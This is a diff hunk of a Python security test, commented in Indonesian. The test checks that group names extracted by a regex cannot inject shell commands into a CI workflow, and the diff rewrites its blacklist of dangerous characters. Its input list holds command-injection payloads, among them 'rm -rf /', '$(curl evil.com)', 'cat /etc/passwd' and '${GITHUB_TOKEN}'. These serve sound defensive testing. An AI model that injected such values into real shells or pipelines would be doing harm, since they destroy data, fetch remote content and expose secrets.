@@ -5174,7 +5174,7 @@ def test_nama_grup_tidak_bisa_menyuntik_shell():
     steps.tg.outputs.grup. Yang menjaganya adalah DAFTAR PUTIH karakter di regex
     pengekstrak — bukan pelolosan di sisi shell. Kalau daftar itu pernah dilonggarkan,
     tes ini yang harus berteriak lebih dulu."""
-    berbahaya = set('"$`;|&<>\n\r\()${}')
+    berbahaya = set(chr(34) + "$`;|&<>()${}" + chr(10) + chr(13) + chr(92))
     for jahat in ('grup "; rm -rf / ; echo "', "grup $(curl evil.com)",
                   "grup `whoami`", 'grup a"b', "grup a; cat /etc/passwd",
                   "grup ${GITHUB_TOKEN}", "grup a\nb", "grup a$IFS$9b"):
